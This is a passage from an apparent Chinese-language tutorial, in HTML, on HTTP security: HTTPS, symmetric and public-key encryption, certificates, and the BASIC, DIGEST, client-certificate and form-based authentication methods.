<p>&#x7531;&#x4E8E;HTTP&#x534F;&#x8BAE;&#x4E2D;&#x6CA1;&#x6709;&#x52A0;&#x5BC6;&#x673A;&#x5236;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5BF9;HTTP&#x534F;&#x8BAE;&#x4F20;&#x8F93;&#x7684;&#x5185;&#x5BB9;&#x672C;&#x8EAB;&#x52A0;&#x5BC6;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x9700;&#x8981;&#x5BF9;HTTP&#x62A5;&#x6587;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#x540E;&#x518D;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;&#x4E3A;&#x4E86;&#x505A;&#x5230;&#x6709;&#x6548;&#x7684;&#x5185;&#x5BB9;&#x52A0;&#x5BC6;&#xFF0C;&#x524D;&#x63D0;&#x662F;&#x8981;&#x6C42;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x5177;&#x5907;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x673A;&#x5236;&#x3002;</p>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x7684;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x4E0D;&#x4F1A;&#x5BF9;&#x901A;&#x4FE1;&#x65B9;&#x8FDB;&#x884C;&#x786E;&#x8BA4;&#x3002;&#x4EFB;&#x4F55;&#x4EBA;&#x90FD;&#x53EF;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x4E0D;&#x8BBA;&#x662F;&#x8C01;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x786E;&#x8BA4;&#x901A;&#x4FE1;&#x65B9;&#xFF0C;&#x4F1A;&#x5B58;&#x5728;&#x5404;&#x79CD;&#x9690;&#x60A3;&#x4EE5;&#x53CA;&#x6D77;&#x91CF;&#x8BF7;&#x6C42;&#x4E0B;&#x7684;DoS&#x653B;&#x51FB;&#x3002;&#x867D;&#x7136;&#x4F7F;&#x7528;HTTP&#x534F;&#x8BAE;&#x65E0;&#x6CD5;&#x786E;&#x5B9A;&#x901A;&#x4FE1;&#x65B9;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x4F7F;&#x7528;SSL&#x5219;&#x53EF;&#x4EE5;&#x3002;SSL&#x4E0D;&#x4EC5;&#x63D0;&#x4F9B;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x79CD;&#x88AB;&#x79F0;&#x4E3A;&#x8BC1;&#x4E66;&#x7684;&#x624B;&#x6BB5;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x786E;&#x5B9A;&#x65B9;&#x3002;&#x8BC1;&#x4E66;&#x7531;&#x503C;&#x5F97;&#x4FE1;&#x4EFB;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x673A;&#x6784;&#x9881;&#x53D1;&#xFF0C;&#x7528;&#x4EE5;&#x8BC1;&#x660E;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5B9E;&#x9645;&#x5B58;&#x5728;&#x7684;&#x3002;</p>
<p>&#x7531;&#x4E8E;HTTP&#x534F;&#x8BAE;&#x65E0;&#x6CD5;&#x8BC1;&#x660E;&#x901A;&#x4FE1;&#x7684;&#x62A5;&#x6587;&#x5B8C;&#x6574;&#x6027;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x9001;&#x51FA;&#x4E4B;&#x540E;&#x76F4;&#x5230;&#x5BF9;&#x65B9;&#x63A5;&#x6536;&#x4E4B;&#x524D;&#x7684;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x5373;&#x4F7F;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x7684;&#x5185;&#x5BB9;&#x906D;&#x5230;&#x7BE1;&#x6539;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x83B7;&#x6089;&#x3002;&#x50CF;&#x8FD9;&#x6837;&#xFF0C;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x5728;&#x4F20;&#x8F93;&#x9014;&#x4E2D;&#xFF0C;&#x906D;&#x653B;&#x51FB;&#x8005;&#x62E6;&#x622A;&#x5E76;&#x7BE1;&#x6539;&#x5185;&#x5BB9;&#x7684;&#x653B;&#x51FB;&#x79F0;&#x4E3A;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;&#xFF08;Man-in-the-Middle attack,MITM&#xFF09;&#x3002;&#x867D;&#x7136;&#x6709;&#x4F7F;&#x7528;HTTP&#x534F;&#x8BAE;&#x786E;&#x5B9A;&#x62A5;&#x6587;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x4E8B;&#x5B9E;&#x4E0A;&#x5E76;&#x4E0D;&#x4FBF;&#x6377;&#x3001;&#x53EF;&#x9760;&#x3002;&#x5176;&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x662F;MD5&#x548C;SHA-1&#x7B49;&#x6563;&#x5217;&#x503C;&#x6821;&#x9A8C;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA;&#x7528;&#x6765;&#x786E;&#x8BA4;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#x65B9;&#x6CD5;&#xFF08;&#x9632;&#x6B62;&#x7BE1;&#x6539;&#xFF09;&#x3002;</p>
<p>&#x901A;&#x5E38;&#xFF0C;HTTP&#x76F4;&#x63A5;&#x548C;TCP&#x901A;&#x4FE1;&#x3002;&#x5F53;&#x4F7F;&#x7528;SSL&#x65F6;&#xFF0C;&#x5219;&#x6F14;&#x53D8;&#x6210;&#x5148;&#x548C;SSL&#x901A;&#x4FE1;&#xFF0C;&#x518D;&#x7531;SSL&#x548C;TCP&#x901A;&#x4FE1;&#x4E86;&#x3002;&#x7B80;&#x8A00;&#x4E4B;&#xFF0C;&#x6240;&#x8C13;HTTPS&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x8EAB;&#x62AB;SSL&#x534F;&#x8BAE;&#x8FD9;&#x5C42;&#x5916;&#x58F3;&#x7684;HTTP&#x3002;&#x5728;&#x91C7;&#x7528;SSL&#x540E;&#xFF0C;HTTP&#x5C31;&#x62E5;&#x6709;&#x4E86;HTTPS&#x7684;&#x52A0;&#x5BC6;&#x3001;&#x8BC1;&#x4E66;&#x548C;&#x5B8C;&#x6574;&#x6027;&#x4FDD;&#x62A4;&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#x3002;SSL&#x662F;&#x72EC;&#x7ACB;&#x4E8E;HTTP&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x5149;&#x662F;HTTP&#x534F;&#x8BAE;&#xFF0C;&#x5176;&#x4ED6;&#x8FD0;&#x884C;&#x5728;&#x5E94;&#x7528;&#x5C42;&#x7684;SMTP&#x548C;Telnet&#x7B49;&#x534F;&#x8BAE;&#x5747;&#x53EF;&#x914D;&#x5408;SSL&#x534F;&#x8BAE;&#x4F7F;&#x7528;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;SSL&#x662F;&#x5F53;&#x4ECA;&#x4E16;&#x754C;&#x4E0A;&#x5E94;&#x7528;&#x6700;&#x4E3A;&#x5E7F;&#x6CDB;&#x7684;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6280;&#x672F;&#x3002;</p>
<p>&#x5728;&#x5BF9;SSL&#x8FDB;&#x884C;&#x8BB2;&#x89E3;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x6765;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#x3002;&#x8FD1;&#x4EE3;&#x7684;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#x4E2D;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x662F;&#x516C;&#x5F00;&#x7684;&#xFF0C;&#x800C;&#x5BC6;&#x94A5;&#x5374;&#x662F;&#x4FDD;&#x5BC6;&#x7684;&#x3002;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x90FD;&#x4F1A;&#x7528;&#x5230;&#x5BC6;&#x94A5;&#x3002;&#x6CA1;&#x6709;&#x5BC6;&#x94A5;&#x5C31;&#x65E0;&#x6CD5;&#x5BF9;&#x5BC6;&#x7801;&#x89E3;&#x5BC6;&#xFF0C;&#x53CD;&#x8FC7;&#x6765;&#x8BF4;&#xFF0C;&#x4EFB;&#x4F55;&#x4EBA;&#x53EA;&#x8981;&#x6301;&#x6709;&#x5BC6;&#x94A5;&#x5C31;&#x80FD;&#x89E3;&#x5BC6;&#x4E86;&#x3002;&#x5982;&#x679C;&#x5BC6;&#x94A5;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x83B7;&#x5F97;&#xFF0C;&#x90A3;&#x52A0;&#x5BC6;&#x4E5F;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x610F;&#x4E49;&#x3002;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x540C;&#x7528;&#x4E00;&#x4E2A;&#x5BC6;&#x94A5;&#x7684;&#x65B9;&#x5F0F;&#x79F0;&#x4E3A;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#xFF08;Common key crypto system&#xFF09;&#xFF0C;&#x4E5F;&#x88AB;&#x53EB;&#x505A;<strong>&#x5BF9;&#x79F0;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;</strong>&#x3002;&#x4EE5;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x65B9;&#x5F0F;&#x52A0;&#x5BC6;&#x65F6;&#x5FC5;&#x987B;&#x5C06;&#x5BC6;&#x94A5;&#x4E5F;&#x53D1;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x53EF;&#x7A76;&#x7ADF;&#x600E;&#x6837;&#x624D;&#x80FD;&#x5B89;&#x5168;&#x5730;&#x8F6C;&#x4EA4;&#xFF1F;&#x8FD9;&#x65F6;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x7684;&#x56F0;&#x5883;&#x3002;<strong>&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;</strong>&#x4F7F;&#x7528;&#x4E00;&#x5BF9;<strong>&#x975E;&#x5BF9;&#x79F0;&#x7684;&#x5BC6;&#x94A5;</strong>&#x3002;&#x4E00;&#x628A;&#x53EB;&#x505A;<strong>&#x79C1;&#x6709;&#x5BC6;&#x94A5;</strong>&#xFF08;private key&#xFF09;&#xFF0C;&#x53E6;&#x4E00;&#x628A;&#x53EB;&#x505A;<strong>&#x516C;&#x5F00;&#x5BC6;&#x94A5;</strong>&#xFF08;public key&#xFF09;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x79C1;&#x6709;&#x5BC6;&#x94A5;&#x4E0D;&#x80FD;&#x8BA9;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x4EBA;&#x77E5;&#x9053;&#xFF0C;&#x800C;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x5219;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x53D1;&#x5E03;&#xFF0C;&#x4EFB;&#x4F55;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x3002;<br>
&#x4F7F;&#x7528;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;&#xFF0C;&#x53D1;&#x9001;&#x5BC6;&#x6587;&#x7684;&#x4E00;&#x65B9;&#x4F7F;&#x7528;&#x5BF9;&#x65B9;&#x7684;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#xFF0C;&#x5BF9;&#x65B9;&#x6536;&#x5230;&#x88AB;&#x52A0;&#x5BC6;&#x7684;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x518D;&#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x79C1;&#x6709;&#x5BC6;&#x94A5;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#x3002;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x53D1;&#x9001;&#x7528;&#x6765;&#x89E3;&#x5BC6;&#x7684;&#x79C1;&#x6709;&#x5BC6;&#x94A5;&#xFF0C;&#x4E5F;&#x4E0D;&#x5FC5;&#x62C5;&#x5FC3;&#x5BC6;&#x94A5;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x7A83;&#x542C;&#x800C;&#x76D7;&#x8D70;&#x3002;</p>
<p>HTTPS&#x91C7;&#x7528;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x548C;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x4E24;&#x8005;&#x5E76;&#x7528;&#x7684;&#x6DF7;&#x5408;&#x52A0;&#x5BC6;&#x673A;&#x5236;&#x3002;&#x82E5;&#x5BC6;&#x94A5;&#x80FD;&#x591F;&#x5B9E;&#x73B0;&#x5B89;&#x5168;&#x4EA4;&#x6362;&#xFF0C;&#x90A3;&#x4E48;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x8003;&#x8651;&#x4EC5;&#x4F7F;&#x7528;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x6765;&#x901A;&#x4FE1;&#x3002;&#x4F46;&#x662F;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x4E0E;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x76F8;&#x6BD4;&#xFF0C;&#x5176;&#x5904;&#x7406;&#x901F;&#x5EA6;&#x8981;&#x6162;&#x3002;&#x5173;&#x4E8E; SSL &#x7684;&#x8BC1;&#x660E;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x6B63;&#x786E;&#x6027;&#x7684;&#x8BC1;&#x4E66;&#x6765;&#x6E90;&#xFF0C;&#x6570;&#x5B57;&#x8BC1;&#x4E66;&#x8BA4;&#x8BC1;&#x673A;&#x6784;&#x5904;&#x4E8E;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x53CC;&#x65B9;&#x90FD;&#x53EF;&#x4FE1;&#x8D56;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x673A;&#x6784;&#x7684;&#x7ACB;&#x573A;&#x4E0A;&#x3002;&#x6570;&#x5B57;&#x8BC1;&#x4E66;&#x8BA4;&#x8BC1;&#x673A;&#x6784;&#x5728;&#x5224;&#x660E;&#x63D0;&#x51FA;&#x7533;&#x8BF7;&#x8005;&#x7684;&#x8EAB;&#x4EFD;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x5BF9;&#x5DF2;&#x7533;&#x8BF7;&#x7684;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x505A;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#xFF0C;&#x7136;&#x540E;&#x5206;&#x914D;&#x8FD9;&#x4E2A;&#x5DF2;&#x7B7E;&#x540D;&#x7684;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#xFF0C;&#x5E76;&#x5C06;&#x8BE5;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x653E;&#x5165;&#x516C;&#x94A5;&#x8BC1;&#x4E66;&#x540E;&#x7ED1;&#x5B9A;&#x5728;&#x4E00;&#x8D77;&#x3002;</p>
<h2 id="%E7%A1%AE%E8%AE%A4%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E7%9A%84%E8%AE%A4%E8%AF%81">&#x786E;&#x8BA4;&#x8BBF;&#x95EE;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x7684;&#x8BA4;&#x8BC1;</h2>
<p>&#x67D0;&#x4E9B;&#x9875;&#x9762;&#x53EA;&#x60F3;&#x8BA9;&#x7279;&#x5B9A;&#x7684;&#x4EBA;&#x6D4F;&#x89C8;&#xFF0C;&#x4E3A;&#x8FBE;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x6807;&#x5FC5;&#x4E0D;&#x53EF;&#x5C11;&#x7684;&#x5C31;&#x662F;&#x8BA4;&#x8BC1;&#x529F;&#x80FD;&#x3002;</p>
<h3 id="basic%E8%AE%A4%E8%AF%81">BASIC&#x8BA4;&#x8BC1;</h3>
<p>BASIC&#x8BA4;&#x8BC1;&#xFF08;&#x57FA;&#x672C;&#x8BA4;&#x8BC1;&#xFF09;&#x662F;&#x4ECE;HTTP/1.0&#x5C31;&#x5B9A;&#x4E49;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x5373;&#x4FBF;&#x662F;&#x73B0;&#x5728;&#x4ECD;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x7F51;&#x7AD9;&#x4F1A;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x662F;Web&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x901A;&#x4FE1;&#x5BA2;&#x6237;&#x7AEF;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;</p>
<p>&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x9700;&#x8981;BASIC&#x8BA4;&#x8BC1;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x968F;&#x72B6;&#x6001;&#x7801;401 Authorization Required&#xFF0C;&#x8FD4;&#x56DE;&#x5E26;WWW-Authenticate&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x7684;&#x54CD;&#x5E94;&#x3002;&#x8BE5;&#x5B57;&#x6BB5;&#x5185;&#x5305;&#x542B;&#x8BA4;&#x8BC1;&#x7684;&#x65B9;&#x5F0F;&#xFF08;BASIC&#xFF09;&#x53CA;Request-URI&#x5B89;&#x5168;&#x57DF;&#x5B57;&#x7B26;&#x4E32;&#xFF08;realm&#xFF09;&#x3002;&#x63A5;&#x6536;&#x5230;&#x72B6;&#x6001;&#x7801;401&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x4E3A;&#x4E86;&#x901A;&#x8FC7;BASIC&#x8BA4;&#x8BC1;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x7528;&#x6237;ID&#x53CA;&#x5BC6;&#x7801;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x3002;&#x53D1;&#x9001;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5185;&#x5BB9;&#x662F;&#x7531;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x6784;&#x6210;&#xFF0C;&#x4E24;&#x8005;&#x4E2D;&#x95F4;&#x4EE5;&#x5192;&#x53F7;&#xFF08;:&#xFF09;&#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x518D;&#x7ECF;&#x8FC7;Base64&#x7F16;&#x7801;&#x5904;&#x7406;&#x3002;&#x63A5;&#x6536;&#x5230;&#x5305;&#x542B;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Authorization&#x8BF7;&#x6C42;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F1A;&#x5BF9;&#x8BA4;&#x8BC1;&#x4FE1;&#x606F;&#x7684;&#x6B63;&#x786E;&#x6027;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#x3002;&#x5982;&#x9A8C;&#x8BC1;&#x901A;&#x8FC7;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x4E00;&#x6761;&#x5305;&#x542B;Request-URI&#x8D44;&#x6E90;&#x7684;&#x54CD;&#x5E94;&#x3002;</p>
<p>BASIC&#x8BA4;&#x8BC1;&#x867D;&#x7136;&#x91C7;&#x7528;Base64&#x7F16;&#x7801;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x8FD9;&#x4E0D;&#x662F;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#x3002;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x9644;&#x52A0;&#x4FE1;&#x606F;&#x5373;&#x53EF;&#x5BF9;&#x5176;&#x89E3;&#x7801;&#x3002;&#x6362;&#x8A00;&#x4E4B;&#xFF0C;&#x7531;&#x4E8E;&#x660E;&#x6587;&#x89E3;&#x7801;&#x540E;&#x5C31;&#x662F;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5728;HTTP&#x7B49;&#x975E;&#x52A0;&#x5BC6;&#x901A;&#x4FE1;&#x7684;&#x7EBF;&#x8DEF;&#x4E0A;&#x8FDB;&#x884C;BASIC&#x8BA4;&#x8BC1;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x4EBA;&#x7A83;&#x542C;&#xFF0C;&#x88AB;&#x76D7;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x6781;&#x9AD8;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#x60F3;&#x518D;&#x8FDB;&#x884C;&#x4E00;&#x6B21;BASIC&#x8BA4;&#x8BC1;&#x65F6;&#xFF0C;&#x4E00;&#x822C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5374;&#x65E0;&#x6CD5;&#x5B9E;&#x73B0;&#x8BA4;&#x8BC1;&#x6CE8;&#x9500;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x95EE;&#x9898;&#x4E4B;&#x4E00;&#x3002;BASIC&#x8BA4;&#x8BC1;&#x4F7F;&#x7528;&#x4E0A;&#x4E0D;&#x591F;&#x4FBF;&#x6377;&#x7075;&#x6D3B;&#xFF0C;&#x4E14;&#x8FBE;&#x4E0D;&#x5230;&#x591A;&#x6570;Web&#x7F51;&#x7AD9;&#x671F;&#x671B;&#x7684;&#x5B89;&#x5168;&#x6027;&#x7B49;&#x7EA7;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x5E76;&#x4E0D;&#x5E38;&#x7528;&#x3002;</p>
<h3 id="digest%E8%AE%A4%E8%AF%81">DIGEST&#x8BA4;&#x8BC1;</h3>
<p>&#x4E3A;&#x5F25;&#x8865;BASIC&#x8BA4;&#x8BC1;&#x5B58;&#x5728;&#x7684;&#x5F31;&#x70B9;&#xFF0C;&#x4ECE;HTTP/1.1&#x8D77;&#x5C31;&#x6709;&#x4E86;DIGEST&#x8BA4;&#x8BC1;&#x3002;DIGEST&#x8BA4;&#x8BC1;&#x540C;&#x6837;&#x4F7F;&#x7528;&#x8D28;&#x8BE2;/&#x54CD;&#x5E94;&#x7684;&#x65B9;&#x5F0F;&#xFF08;challenge/response&#xFF09;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x50CF;BASIC&#x8BA4;&#x8BC1;&#x90A3;&#x6837;&#x76F4;&#x63A5;&#x53D1;&#x9001;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x3002;&#x6240;&#x8C13;&#x8D28;&#x8BE2;&#x54CD;&#x5E94;&#x65B9;&#x5F0F;&#x662F;&#x6307;&#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x4E00;&#x65B9;&#x4F1A;&#x5148;&#x53D1;&#x9001;&#x8BA4;&#x8BC1;&#x8981;&#x6C42;&#x7ED9;&#x53E6;&#x4E00;&#x65B9;&#xFF0C;&#x63A5;&#x7740;&#x4F7F;&#x7528;&#x4ECE;&#x53E6;&#x4E00;&#x65B9;&#x90A3;&#x63A5;&#x6536;&#x5230;&#x7684;&#x8D28;&#x8BE2;&#x7801;&#x8BA1;&#x7B97;&#x751F;&#x6210;&#x54CD;&#x5E94;&#x7801;&#x3002;&#x6700;&#x540E;&#x5C06;&#x54CD;&#x5E94;&#x7801;&#x8FD4;&#x56DE;&#x7ED9;&#x5BF9;&#x65B9;&#x8FDB;&#x884C;&#x8BA4;&#x8BC1;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p>
<h3 id="ssl%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81">SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;</h3>
<p>&#x4ECE;&#x4F7F;&#x7528;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x65B9;&#x9762;&#x6765;&#x8BB2;&#xFF0C;&#x53EA;&#x8981;&#x4E8C;&#x8005;&#x7684;&#x5185;&#x5BB9;&#x6B63;&#x786E;&#xFF0C;&#x5373;&#x53EF;&#x8BA4;&#x8BC1;&#x662F;&#x672C;&#x4EBA;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x4F46;&#x5982;&#x679C;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x88AB;&#x76D7;&#xFF0C;&#x5C31;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x88AB;&#x7B2C;&#x4E09;&#x8005;&#x5192;&#x5145;&#x3002;&#x5229;&#x7528;SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x5219;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x8BE5;&#x60C5;&#x51B5;&#x7684;&#x53D1;&#x751F;&#x3002;</p>
<p>SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x662F;&#x501F;&#x7531;HTTPS&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8BC1;&#x4E66;&#x5B8C;&#x6210;&#x8BA4;&#x8BC1;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x51ED;&#x501F;&#x5BA2;&#x6237;&#x7AEF;&#x8BC1;&#x4E66;&#x8BA4;&#x8BC1;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x786E;&#x8BA4;&#x8BBF;&#x95EE;&#x662F;&#x5426;&#x6765;&#x81EA;&#x5DF2;&#x767B;&#x5F55;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x4E3A;&#x8FBE;&#x5230;SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x7684;&#x76EE;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x4E8B;&#x5148;&#x5C06;&#x5BA2;&#x6237;&#x7AEF;&#x8BC1;&#x4E66;&#x5206;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4E14;&#x5BA2;&#x6237;&#x7AEF;&#x5FC5;&#x987B;&#x5B89;&#x88C5;&#x6B64;&#x8BC1;&#x4E66;&#x3002;</p>
<p>&#x5728;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;SSL&#x5BA2;&#x6237;&#x7AEF;&#x8BA4;&#x8BC1;&#x4E0D;&#x4F1A;&#x4EC5;&#x4F9D;&#x9760;&#x8BC1;&#x4E66;&#x5B8C;&#x6210;&#x8BA4;&#x8BC1;&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x548C;&#x57FA;&#x4E8E;&#x8868;&#x5355;&#x8BA4;&#x8BC1;&#xFF08;&#x7A0D;&#x540E;&#x8BB2;&#x89E3;&#xFF09;&#x7EC4;&#x5408;&#x5F62;&#x6210;&#x4E00;&#x79CD;&#x53CC;&#x56E0;&#x7D20;&#x8BA4;&#x8BC1;&#xFF08;Two-factor authentication&#xFF09;&#x6765;&#x4F7F;&#x7528;&#x3002;</p>
<h3 id="%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81">&#x57FA;&#x4E8E;&#x8868;&#x5355;&#x8BA4;&#x8BC1;</h3>
<p>&#x57FA;&#x4E8E;&#x8868;&#x5355;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x6CD5;&#x5E76;&#x4E0D;&#x662F;&#x5728;HTTP&#x534F;&#x8BAE;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x5411;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;Web&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53D1;&#x9001;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#xFF08;Credential&#xFF09;&#xFF0C;&#x6309;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x7684;&#x9A8C;&#x8BC1;&#x7ED3;&#x679C;&#x8BA4;&#x8BC1;&#x3002;</p>
